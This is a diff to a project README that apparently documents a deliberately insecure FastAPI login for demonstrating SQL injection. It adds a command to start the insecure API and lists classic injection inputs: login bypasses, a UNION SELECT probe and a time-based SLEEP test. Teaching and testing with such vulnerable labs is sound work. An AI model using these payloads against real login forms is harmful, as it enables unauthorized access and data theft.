@@ -92,3 +92,27 @@ Automatically generate migration files based on model changes.
 
 Applies all migrations to the database.
 -alembic upgrade head
+
+
+# start insecure api 
+-uvicorn InSecureControllers.InSecureUserController:app --reload
+
+
+SQLINJECTION INPUT FOR INSECURE LOGIN 
+
+#for admin
+username= admin
+password = ' OR '1'='1
+
+#for any unknow user
+
+username: ' OR 1=1 -- #important!! you have to add a space after '--'  
+password: asd
+
+
+	' OR '1'='1
+	2.	' OR 1=1 --
+	3.	' UNION SELECT NULL, NULL, NULL --
+	4.	' AND 1=1 --
+	5.	' AND SLEEP(5) --
+	6.	' OR EXISTS (SELECT * FROM users) --
